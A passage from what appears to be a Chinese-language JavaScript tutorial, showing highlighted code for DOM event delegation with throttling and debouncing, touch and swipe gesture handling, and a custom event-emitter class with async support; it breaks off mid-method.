      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">bindNewElement</span>(child);
    });
  }
  
  <span class="hljs-comment">// 事件节流委托</span>
  <span class="hljs-title function_">onThrottled</span>(<span class="hljs-params">eventType, selector, handler, delay = <span class="hljs-number">100</span></span>) {
    <span class="hljs-keyword">let</span> lastCall = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> timeoutId = <span class="hljs-literal">null</span>;
    
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">throttledHandler</span> = (<span class="hljs-params">event</span>) =&gt; {
      <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
      <span class="hljs-keyword">const</span> timeSinceLastCall = now - lastCall;
      
      <span class="hljs-keyword">if</span> (timeSinceLastCall &gt;= delay) {
        lastCall = now;
        handler.<span class="hljs-title function_">call</span>(event.<span class="hljs-property">target</span>, event);
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 取消之前的超时</span>
        <span class="hljs-keyword">if</span> (timeoutId) {
          <span class="hljs-built_in">clearTimeout</span>(timeoutId);
        }
        
        <span class="hljs-comment">// 设置新的超时</span>
        timeoutId = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
          lastCall = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
          handler.<span class="hljs-title function_">call</span>(event.<span class="hljs-property">target</span>, event);
        }, delay - timeSinceLastCall);
      }
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">on</span>(eventType, selector, throttledHandler);
  }
  
  <span class="hljs-comment">// 事件防抖委托</span>
  <span class="hljs-title function_">onDebounced</span>(<span class="hljs-params">eventType, selector, handler, delay = <span class="hljs-number">100</span></span>) {
    <span class="hljs-keyword">let</span> timeoutId = <span class="hljs-literal">null</span>;
    
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">debouncedHandler</span> = (<span class="hljs-params">event</span>) =&gt; {
      <span class="hljs-keyword">if</span> (timeoutId) {
        <span class="hljs-built_in">clearTimeout</span>(timeoutId);
      }
      
      timeoutId = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        handler.<span class="hljs-title function_">call</span>(event.<span class="hljs-property">target</span>, event);
        timeoutId = <span class="hljs-literal">null</span>;
      }, delay);
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">on</span>(eventType, selector, debouncedHandler);
  }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">EventDelegationExample</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">setupDelegation</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> delegation = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventDelegation</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>);
    
    <span class="hljs-comment">// 为所有按钮添加点击事件</span>
    delegation.<span class="hljs-title function_">on</span>(<span class="hljs-string">'click'</span>, <span class="hljs-string">'.btn'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Button clicked:'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">textContent</span>);
    });
    
    <span class="hljs-comment">// 为动态添加的列表项添加事件</span>
    delegation.<span class="hljs-title function_">on</span>(<span class="hljs-string">'click'</span>, <span class="hljs-string">'.list-item'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'List item clicked:'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">dataset</span>.<span class="hljs-property">id</span>);
    });
    
    <span class="hljs-comment">// 表单提交防抖</span>
    delegation.<span class="hljs-title function_">onDebounced</span>(<span class="hljs-string">'input'</span>, <span class="hljs-string">'.search-input'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Search:'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>);
    }, <span class="hljs-number">300</span>);
    
    <span class="hljs-comment">// 滚动事件节流</span>
    delegation.<span class="hljs-title function_">onThrottled</span>(<span class="hljs-string">'scroll'</span>, <span class="hljs-string">'.scroll-container'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Scrolling...'</span>);
    }, <span class="hljs-number">100</span>);
    
    <span class="hljs-comment">// 一次性事件</span>
    delegation.<span class="hljs-title function_">once</span>(<span class="hljs-string">'click'</span>, <span class="hljs-string">'.intro-modal .close'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentElement</span>.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;
    });
    
    <span class="hljs-keyword">return</span> delegation;
  }
}
</code></pre>
<h5 data-id="heading-12">4.2 触摸事件委托</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TouchEventDelegation</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">EventDelegation</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">rootElement = <span class="hljs-variable language_">document</span></span>) {
    <span class="hljs-variable language_">super</span>(rootElement);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">touchState</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(); <span class="hljs-comment">// Map&lt;touchId, {element, startX, startY}&gt;</span>
    
    <span class="hljs-comment">// 初始化触摸事件</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">initTouchEvents</span>();
  }
  
  <span class="hljs-title function_">initTouchEvents</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 处理触摸开始</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">'touchstart'</span>, <span class="hljs-string">'*'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> touch <span class="hljs-keyword">of</span> event.<span class="hljs-property">changedTouches</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">touchState</span>.<span class="hljs-title function_">set</span>(touch.<span class="hljs-property">identifier</span>, {
          <span class="hljs-attr">element</span>: event.<span class="hljs-property">target</span>,
          <span class="hljs-attr">startX</span>: touch.<span class="hljs-property">clientX</span>,
          <span class="hljs-attr">startY</span>: touch.<span class="hljs-property">clientY</span>,
          <span class="hljs-attr">startTime</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
        });
      }
    }, { <span class="hljs-attr">passive</span>: <span class="hljs-literal">true</span> });
    
    <span class="hljs-comment">// 处理触摸移动</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">'touchmove'</span>, <span class="hljs-string">'*'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> touch <span class="hljs-keyword">of</span> event.<span class="hljs-property">changedTouches</span>) {
        <span class="hljs-keyword">const</span> state = <span class="hljs-variable language_">this</span>.<span class="hljs-property">touchState</span>.<span class="hljs-title function_">get</span>(touch.<span class="hljs-property">identifier</span>);
        <span class="hljs-keyword">if</span> (state) {
          <span class="hljs-keyword">const</span> deltaX = touch.<span class="hljs-property">clientX</span> - state.<span class="hljs-property">startX</span>;
          <span class="hljs-keyword">const</span> deltaY = touch.<span class="hljs-property">clientY</span> - state.<span class="hljs-property">startY</span>;
          
          <span class="hljs-comment">// 触发自定义事件</span>
          <span class="hljs-keyword">const</span> customEvent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'touchdrag'</span>, {
            <span class="hljs-attr">detail</span>: {
              <span class="hljs-attr">touchId</span>: touch.<span class="hljs-property">identifier</span>,
              <span class="hljs-attr">element</span>: state.<span class="hljs-property">element</span>,
              deltaX,
              deltaY,
              <span class="hljs-attr">clientX</span>: touch.<span class="hljs-property">clientX</span>,
              <span class="hljs-attr">clientY</span>: touch.<span class="hljs-property">clientY</span>
            },
            <span class="hljs-attr">bubbles</span>: <span class="hljs-literal">true</span>
          });
          
          state.<span class="hljs-property">element</span>.<span class="hljs-title function_">dispatchEvent</span>(customEvent);
        }
      }
    }, { <span class="hljs-attr">passive</span>: <span class="hljs-literal">true</span> });
    
    <span class="hljs-comment">// 处理触摸结束</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">'touchend'</span>, <span class="hljs-string">'*'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> touch <span class="hljs-keyword">of</span> event.<span class="hljs-property">changedTouches</span>) {
        <span class="hljs-keyword">const</span> state = <span class="hljs-variable language_">this</span>.<span class="hljs-property">touchState</span>.<span class="hljs-title function_">get</span>(touch.<span class="hljs-property">identifier</span>);
        <span class="hljs-keyword">if</span> (state) {
          <span class="hljs-keyword">const</span> deltaTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - state.<span class="hljs-property">startTime</span>;
          <span class="hljs-keyword">const</span> deltaX = touch.<span class="hljs-property">clientX</span> - state.<span class="hljs-property">startX</span>;
          <span class="hljs-keyword">const</span> deltaY = touch.<span class="hljs-property">clientY</span> - state.<span class="hljs-property">startY</span>;
          <span class="hljs-keyword">const</span> distance = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(deltaX * deltaX + deltaY * deltaY);
          
          <span class="hljs-comment">// 判断是否是点击（快速触摸且移动距离小）</span>
          <span class="hljs-keyword">if</span> (deltaTime &lt; <span class="hljs-number">300</span> &amp;&amp; distance &lt; <span class="hljs-number">10</span>) {
            <span class="hljs-keyword">const</span> clickEvent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MouseEvent</span>(<span class="hljs-string">'click'</span>, {
              <span class="hljs-attr">bubbles</span>: <span class="hljs-literal">true</span>,
              <span class="hljs-attr">cancelable</span>: <span class="hljs-literal">true</span>,
              <span class="hljs-attr">clientX</span>: touch.<span class="hljs-property">clientX</span>,
              <span class="hljs-attr">clientY</span>: touch.<span class="hljs-property">clientY</span>
            });
            
            state.<span class="hljs-property">element</span>.<span class="hljs-title function_">dispatchEvent</span>(clickEvent);
          }
          
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">touchState</span>.<span class="hljs-title function_">delete</span>(touch.<span class="hljs-property">identifier</span>);
        }
      }
    }, { <span class="hljs-attr">passive</span>: <span class="hljs-literal">true</span> });
  }
  
  <span class="hljs-comment">// 添加滑动手势支持</span>
  <span class="hljs-title function_">enableSwipe</span>(<span class="hljs-params">selector, options = {}</span>) {
    <span class="hljs-keyword">const</span> defaultOptions = {
      <span class="hljs-attr">threshold</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// 最小滑动距离</span>
      <span class="hljs-attr">velocity</span>: <span class="hljs-number">0.3</span>, <span class="hljs-comment">// 最小速度</span>
      <span class="hljs-attr">direction</span>: <span class="hljs-string">'horizontal'</span> <span class="hljs-comment">// horizontal, vertical, both</span>
    };
    
    <span class="hljs-keyword">const</span> config = { ...defaultOptions, ...options };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">'touchdrag'</span>, selector, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> { deltaX, deltaY, element } = event.<span class="hljs-property">detail</span>;
      
      <span class="hljs-comment">// 检查滑动方向</span>
      <span class="hljs-keyword">const</span> isHorizontal = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(deltaX) &gt; <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(deltaY);
      <span class="hljs-keyword">const</span> isValidDirection = 
        config.<span class="hljs-property">direction</span> === <span class="hljs-string">'both'</span> ||
        (config.<span class="hljs-property">direction</span> === <span class="hljs-string">'horizontal'</span> &amp;&amp; isHorizontal) ||
        (config.<span class="hljs-property">direction</span> === <span class="hljs-string">'vertical'</span> &amp;&amp; !isHorizontal);
      
      <span class="hljs-keyword">if</span> (!isValidDirection) <span class="hljs-keyword">return</span>;
      
      <span class="hljs-comment">// 检查滑动距离</span>
      <span class="hljs-keyword">const</span> distance = isHorizontal ? <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(deltaX) : <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(deltaY);
      <span class="hljs-keyword">if</span> (distance &lt; config.<span class="hljs-property">threshold</span>) <span class="hljs-keyword">return</span>;
      
      <span class="hljs-comment">// 确定滑动方向</span>
      <span class="hljs-keyword">let</span> direction = <span class="hljs-string">''</span>;
      <span class="hljs-keyword">if</span> (isHorizontal) {
        direction = deltaX &gt; <span class="hljs-number">0</span> ? <span class="hljs-string">'right'</span> : <span class="hljs-string">'left'</span>;
      } <span class="hljs-keyword">else</span> {
        direction = deltaY &gt; <span class="hljs-number">0</span> ? <span class="hljs-string">'down'</span> : <span class="hljs-string">'up'</span>;
      }
      
      <span class="hljs-comment">// 触发滑动手势事件</span>
      <span class="hljs-keyword">const</span> swipeEvent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'swipe'</span>, {
        <span class="hljs-attr">detail</span>: {
          direction,
          distance,
          element,
          deltaX,
          deltaY
        },
        <span class="hljs-attr">bubbles</span>: <span class="hljs-literal">true</span>
      });
      
      element.<span class="hljs-title function_">dispatchEvent</span>(swipeEvent);
    });
  }
}
</code></pre>
<h4 data-id="heading-13">五、自定义事件系统</h4>
<h5 data-id="heading-14">5.1 高级事件总线</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EventEmitter</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">onceEvents</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxListeners</span> = <span class="hljs-number">10</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">wildcard</span> = <span class="hljs-literal">false</span>;
  }
  
  <span class="hljs-comment">// 添加事件监听器</span>
  <span class="hljs-title function_">on</span>(<span class="hljs-params">eventName, listener</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>.<span class="hljs-title function_">has</span>(eventName)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>.<span class="hljs-title function_">set</span>(eventName, []);
    }
    
    <span class="hljs-keyword">const</span> listeners = <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>.<span class="hljs-title function_">get</span>(eventName);
    listeners.<span class="hljs-title function_">push</span>(listener);
    
    <span class="hljs-comment">// 检查监听器数量限制</span>
    <span class="hljs-keyword">if</span> (listeners.<span class="hljs-property">length</span> &gt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxListeners</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`Event "<span class="hljs-subst">${eventName}</span>" has more than <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.maxListeners}</span> listeners`</span>);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
  
  <span class="hljs-comment">// 一次性事件监听器</span>
  <span class="hljs-title function_">once</span>(<span class="hljs-params">eventName, listener</span>) {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">onceWrapper</span> = (<span class="hljs-params">...args</span>) =&gt; {
      listener.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">off</span>(eventName, onceWrapper);
    };
    
    <span class="hljs-comment">// 保存原始监听器引用，以便可以正确移除</span>
    onceWrapper.<span class="hljs-property">listener</span> = listener;
    
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">onceEvents</span>.<span class="hljs-title function_">has</span>(eventName)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">onceEvents</span>.<span class="hljs-title function_">set</span>(eventName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>());
    }
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">onceEvents</span>.<span class="hljs-title function_">get</span>(eventName).<span class="hljs-title function_">set</span>(listener, onceWrapper);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">on</span>(eventName, onceWrapper);
  }
  
  <span class="hljs-comment">// 移除事件监听器</span>
  <span class="hljs-title function_">off</span>(<span class="hljs-params">eventName, listener</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>.<span class="hljs-title function_">has</span>(eventName)) <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    
    <span class="hljs-keyword">const</span> listeners = <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>.<span class="hljs-title function_">get</span>(eventName);
    
    <span class="hljs-comment">// 移除特定监听器</span>
    <span class="hljs-keyword">if</span> (listener) {
      <span class="hljs-keyword">const</span> index = listeners.<span class="hljs-title function_">indexOf</span>(listener);
      <span class="hljs-keyword">if</span> (index !== -<span class="hljs-number">1</span>) {
        listeners.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>);
      }
      
      <span class="hljs-comment">// 同时移除once包装器</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">onceEvents</span>.<span class="hljs-title function_">has</span>(eventName)) {
        <span class="hljs-keyword">const</span> onceMap = <span class="hljs-variable language_">this</span>.<span class="hljs-property">onceEvents</span>.<span class="hljs-title function_">get</span>(eventName);
        <span class="hljs-keyword">if</span> (onceMap.<span class="hljs-title function_">has</span>(listener)) {
          <span class="hljs-keyword">const</span> onceWrapper = onceMap.<span class="hljs-title function_">get</span>(listener);
          <span class="hljs-keyword">const</span> wrapperIndex = listeners.<span class="hljs-title function_">indexOf</span>(onceWrapper);
          <span class="hljs-keyword">if</span> (wrapperIndex !== -<span class="hljs-number">1</span>) {
            listeners.<span class="hljs-title function_">splice</span>(wrapperIndex, <span class="hljs-number">1</span>);
          }
          onceMap.<span class="hljs-title function_">delete</span>(listener);
        }
      }
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// 移除所有监听器</span>
      listeners.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>;
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">onceEvents</span>.<span class="hljs-title function_">has</span>(eventName)) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onceEvents</span>.<span class="hljs-title function_">get</span>(eventName).<span class="hljs-title function_">clear</span>();
      }
    }
    
    <span class="hljs-comment">// 如果监听器数组为空，删除事件</span>
    <span class="hljs-keyword">if</span> (listeners.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>.<span class="hljs-title function_">delete</span>(eventName);
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">onceEvents</span>.<span class="hljs-title function_">delete</span>(eventName);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
  
  <span class="hljs-comment">// 触发事件</span>
  <span class="hljs-title function_">emit</span>(<span class="hljs-params">eventName, ...args</span>) {
    <span class="hljs-comment">// 触发精确匹配的事件</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>.<span class="hljs-title function_">has</span>(eventName)) {
      <span class="hljs-keyword">const</span> listeners = <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>.<span class="hljs-title function_">get</span>(eventName).<span class="hljs-title function_">slice</span>();
      
      <span class="hljs-comment">// 异步触发</span>
      <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
        listeners.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">listener</span> =&gt;</span> {
          <span class="hljs-keyword">try</span> {
            listener.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
          } <span class="hljs-keyword">catch</span> (error) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Error in event listener for "<span class="hljs-subst">${eventName}</span>":`</span>, error);
          }
        });
      });
    }
    
    <span class="hljs-comment">// 触发通配符事件</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">wildcard</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-string">'*'</span>, eventName, ...args);
    }
    
    <span class="hljs-comment">// 触发命名空间事件</span>
    <span class="hljs-keyword">const</span> namespaceIndex = eventName.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">':'</span>);
    <span class="hljs-keyword">if</span> (namespaceIndex !== -<span class="hljs-number">1</span>) {
      <span class="hljs-keyword">const</span> namespace = eventName.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, namespaceIndex + <span class="hljs-number">1</span>);
      <span class="hljs-keyword">const</span> eventWithoutNamespace = eventName.<span class="hljs-title function_">substring</span>(namespaceIndex + <span class="hljs-number">1</span>);
      
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>.<span class="hljs-title function_">has</span>(namespace)) {
        <span class="hljs-keyword">const</span> listeners = <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>.<span class="hljs-title function_">get</span>(namespace).<span class="hljs-title function_">slice</span>();
        
        <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
          listeners.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">listener</span> =&gt;</span> {
            <span class="hljs-keyword">try</span> {
              listener.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, eventWithoutNamespace, ...args);
            } <span class="hljs-keyword">catch</span> (error) {
              <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Error in namespace event listener for "<span class="hljs-subst">${namespace}</span>":`</span>, error);
            }
          });
        });
      }
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
  
  <span class="hljs-comment">// 获取事件监听器数量</span>
  <span class="hljs-title function_">listenerCount</span>(<span class="hljs-params">eventName</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>.<span class="hljs-title function_">has</span>(eventName)) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>.<span class="hljs-title function_">get</span>(eventName).<span class="hljs-property">length</span>;
  }
  
  <span class="hljs-comment">// 获取所有事件名称</span>
  <span class="hljs-title function_">eventNames</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>.<span class="hljs-title function_">keys</span>());
  }
  
  <span class="hljs-comment">// 设置最大监听器数量</span>
  <span class="hljs-title function_">setMaxListeners</span>(<span class="hljs-params">n</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxListeners</span> = n;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
  
  <span class="hljs-comment">// 启用通配符监听</span>
  <span class="hljs-title function_">enableWildcard</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">wildcard</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
  
  <span class="hljs-comment">// 链式操作支持</span>
  <span class="hljs-title function_">chain</span>(<span class="hljs-params">eventName</span>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">on</span>: <span class="hljs-function">(<span class="hljs-params">listener</span>) =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">on</span>(eventName, listener);
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
      },
      <span class="hljs-attr">once</span>: <span class="hljs-function">(<span class="hljs-params">listener</span>) =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">once</span>(eventName, listener);
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
      },
      <span class="hljs-attr">off</span>: <span class="hljs-function">(<span class="hljs-params">listener</span>) =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">off</span>(eventName, listener);
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
      },
      <span class="hljs-attr">emit</span>: <span class="hljs-function">(<span class="hljs-params">...args</span>) =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit</span>(eventName, ...args);
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
      }
    };
  }
}

<span class="hljs-comment">// 异步事件系统</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncEventEmitter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">EventEmitter</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">super</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">asyncListeners</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
  }
  
  <span class="hljs-comment">// 添加异步事件监听器</span>
  <span class="hljs-title function_">onAsync</span>(<span class="hljs-params">eventName, listener</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">asyncListeners</span>.<span class="hljs-title function_">has</span>(eventName)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">asyncListeners</span>.<span class="hljs-title function_">set</span>(eventName, []);
    }
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">asyncListeners</span>.<span class="hljs-title function_">get</span>(eventName).<span class="hljs-title function_">push</span>(listener);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
  
  <span class="hljs-comment">// 异步触发事件</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">emitAsync</span>(<span class="hljs-params">eventName, ...args</span>) {
    <span class="hljs-keyword">const</span> promises = [];
    
    <span class="hljs-comment">// 同步监听器</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>.<span class="hljs-title function_">has</span>(eventName)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>.<span class="hljs-title function_">get</span>(eventName).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">listener</span> =&gt;</span> {
        <span class="hljs-keyword">try</span> {
          <span class="hljs-keyword">const</span> result = listener.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
          <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Promise</span>) {
            promises.<span class="hljs-title function_">push</span>(result);
          }
        } <span class="hljs-keyword">catch</span> (error) {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Error in sync event listener for "<span class="hljs-subst">${eventName}</span>":`</span>, error);
        }
      });
    }
    
    <span class="hljs-comment">// 异步监听器</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">asyncListeners</span>.<span class="hljs-title function_">has</span>(eventName)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">asyncListeners</span>.<span class="hljs-title function_">get</span>(eventName).<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">async</span> listener =&gt; {
        <span class="hljs-keyword">try</span> {
          <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> listener.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
          <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Promise</span>) {
            promises.<span class="hljs-title function_">push</span>(result);
          }
        } <span class="hljs-keyword">catch</span> (error) {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Error in async event listener for "<span class="hljs-subst">${eventName}</span>":`</span>, error);
        }
      });
    }
    
    <span class="hljs-comment">// 等待所有异步操作完成</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(promises);
  }
  
  <span class="hljs-comment">// 带有超时的事件触发</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">emitWithTimeout</span>(<span class="hljs-params">eventName, timeout, ...args</span>) {
